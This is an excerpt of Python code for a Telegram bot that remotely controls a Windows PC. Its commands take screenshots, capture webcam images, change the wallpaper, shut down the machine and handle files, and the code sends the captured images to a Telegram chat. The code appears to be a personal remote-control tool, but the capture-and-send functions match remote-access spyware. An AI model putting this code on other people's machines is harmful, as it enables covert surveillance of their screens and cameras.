...
requests.post(
    f"https://api.telegram.org/bot{token}/sendMessage?chat_id={myId}&text=Выберите команду: /ip, /spec, /screenshot,"
    f" /webcam, /message, /input, /wallpaper, /off, /sleep, /request, /website, /USD, /ton /weather, /file, /folder")
...
def create_folder(message):
    try:
        os.mkdir(rf"forbot\{message.text}")
...
def get_photo(message):
    ...
    with open(rf'C:\Users\super\forbot\{name_f}\{timestr}' + '.jpg',
              'wb') as timestr:
        timestr.write(dfile)
...
def screenshot(message):
    ...
    try:
        pag.screenshot(r'C:\Users\super\forbot\000.jpg')
        with open(r'C:\Users\super\forbot\000.jpg', 'rb') as img:
...
def webcam(message):
    try:
        path = r'C:\Users\super\forbot\cam.jpg'
        ...
        ret, frame = cap.read()
        print('сфоткал')
        cv2.imwrite(r'C:\Users\super\forbot\cam.jpg', frame)
        cap.release()
        print('сохранил')

        with open(r'C:\Users\super\forbot\cam.jpg', 'rb') as img:
            print('отправляю')
            bot.send_photo(message.chat.id, img)
...
def next_wallpaper(message):
    try:
        ...
        with open(r'C:\Users\super\forbot\image.jpg', 'wb') as img:
            img.write(dfile)

        path = os.path.abspath(r'C:\Users\super\forbot\image.jpg')
